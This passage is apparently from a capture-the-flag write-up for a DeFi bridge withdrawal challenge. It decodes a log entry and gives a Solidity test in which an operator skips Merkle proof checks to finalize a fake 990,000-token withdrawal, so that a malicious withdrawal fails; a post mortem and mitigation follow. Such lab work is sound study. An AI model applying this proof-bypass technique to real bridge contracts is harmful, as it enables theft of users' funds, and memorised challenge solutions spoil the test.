2. By understanding how to read each withdrawal events, we would be able to find the malicious event as the third withdrawal event in the log which has a withdrawal amount of 990000 tokens. 
```json
{
    "topics": [
        "0x43738d035e226f1ab25d294703b51025bde812317da73f87d849abbdbb6526f5",
        "0x0000000000000000000000000000000000000000000000000000000000000002",
        "0x00000000000000000000000087EAD3e78Ef9E26de92083b75a3b037aC2883E16",
        "0x000000000000000000000000fF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5"
    ],
    "data": "0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea6889090150000000000000000000000000000000000000000000000000000000066729bea0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000010401210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c26000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
},
```
3. Since we can bypass the merkle proof verification with our privileged role, we can initiate and finalize a fake withdrawal to withdraw a large amount of tokens so that the malicious one will not succeed (but could still be finalized)
4. Lastly, transfer back and return the fake withdrawal tokens.

``` solidity
function test_withdrawal() public checkSolvedByPlayer {

    uint256 amountToWithdraw = 990_000e18;
    // Create a fabricated withdrawal that transfers 990,000 tokens to the player
    bytes memory message = abi.encodeCall(
        L1Forwarder.forwardMessage,
        (
            0, 
            address(0), 
            address(l1TokenBridge), 
            abi.encodeCall( 
                TokenBridge.executeTokenWithdrawal,
                (
                    player, 
                    amountToWithdraw
                )
            )
        )
    );

    // Use operator privilege to finalize the fake withdrawal without providing Merkle proof
    l1Gateway.finalizeWithdrawal(
        0, // nonce
        l2Handler, // impersonate l2Handler to pass authorization checks in TokenBridge 
        address(l1Forwarder), // target to process the forwarded message
        block.timestamp - 7 days, // old timestamp to pass the 7-day delay requirement
        message, 
        new bytes32[](0) // empty proof array since we're using operator privilege  
    );

    // Move time forward past the delay period for the legitimate withdrawals
    vm.warp(block.timestamp + 8 days);
    
    l1Gateway.finalizeWithdrawal(
        0, // nonce
        0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
        1718786915, // timestamp
        hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbAd8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // encoded message data
        new bytes32[](0) // no proof needed as operator
    );

    l1Gateway.finalizeWithdrawal(
        1, // nonce
        0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
        1718786965, // timestamp
        hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbAd8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // encoded message data
        new bytes32[](0) // no proof needed as operator
    );

    // Finalize the malicious third withdrawal (990,000 tokens)
    // This will fail during execution due to insufficient funds
    l1Gateway.finalizeWithdrawal(
        2, // nonce
        0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
        1718787050, // timestamp
        hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2C4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // encoded message data
        new bytes32[](0) // no proof needed as operator
    );

    l1Gateway.finalizeWithdrawal(
        3, // nonce
        0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
        1718787127, // timestamp
        hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2C4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // encoded message data
        new bytes32[](0) // no proof needed as operator
    );

    // Return the borrowed tokens to the bridge
    token.transfer(address(l1TokenBridge), amountToWithdraw);
}
```
### Post Mortem
The 990,000-token withdrawal exists in the L2 message log and could be accepted because the L1 finalisation flow allowed two ways to authorize execution:

- By presenting a Merkle proof that matches the gateway root (so any logged withdrawal with a valid proof can be processed).
- By an entity holding the gateway OPERATOR_ROLE which may call finalizeWithdrawal without providing a proof and can forward an arbitrary L1 message to the TokenBridge.

Because operators (or a trusted forwarder) can submit a forwarded message that directly calls `TokenBridge.executeTokenWithdrawal`, and TokenBridge performs a simple custodial transfer if the bridge balance (totalDeposits) is sufficient, a large withdrawal present in the logs (990k) could be executed. The test protection therefore finalises a controlled fake withdrawal first to consume tokens so the later malicious 990k attempt fails due to insufficient funds. 
### Mitigation
- Always enforce merkle proof verification to prevent/minimise centralisation risks of privileged roles.

